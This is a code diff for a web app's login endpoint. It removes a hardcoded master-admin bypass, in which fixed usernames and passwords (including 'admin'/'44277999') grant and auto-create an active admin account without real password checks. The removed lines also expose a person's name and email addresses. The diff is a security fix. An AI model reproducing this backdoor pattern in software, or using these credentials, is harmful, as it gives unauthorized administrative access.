@@ -3721,38 +3721,11 @@ app.post('/api/user-auth/login', async (req, res) => {
   }
 
   const data = loadUsersData();
-  let user = data.users.find(u => u.username.toLowerCase() === cleanUsername || (u.email && u.email.toLowerCase() === cleanUsername));
+  const user = data.users.find(u => u.username.toLowerCase() === cleanUsername || (u.email && u.email.toLowerCase() === cleanUsername));
 
-  const isMasterAdmin = (cleanUsername === 'admin' || cleanUsername === 'shawon421' || cleanUsername === 'srshawon421@gmail.com') && 
-                        (cleanPassword === '44277999' || cleanPassword === 'admin');
-
-  if (!user && isMasterAdmin) {
-    user = {
-      id: cleanUsername === 'admin' ? 'usr_admin_001' : 'usr_1787812528386_taky',
-      username: cleanUsername === 'admin' ? 'admin' : 'shawon421',
-      password: hashPassword(cleanPassword),
-      name: cleanUsername === 'admin' ? 'System Administrator' : 'Saydur Rahaman Shawon',
-      email: cleanUsername === 'admin' ? 'saidur@sinhafwl.com' : 'srshawon421@gmail.com',
-      role: 'admin',
-      status: 'active',
-      canViewDashboard: true,
-      emailVerified: true,
-      createdAt: new Date().toISOString()
-    };
-    data.users.push(user);
-    saveUsersData(data);
-  }
-
-  if (!user || (!verifyPassword(cleanPassword, user.password) && !isMasterAdmin)) {
+  if (!user || !verifyPassword(cleanPassword, user.password)) {
     recordFailedLogin(cleanUsername);
     return res.json({ success: false, error: 'Invalid username/email or password.' });
-  }
-
-  if (isMasterAdmin) {
-    user.role = 'admin';
-    user.status = 'active';
-    user.canViewDashboard = true;
-    user.emailVerified = true;
   }
 
   // Check Email Verification Status if Email Verification is enabled
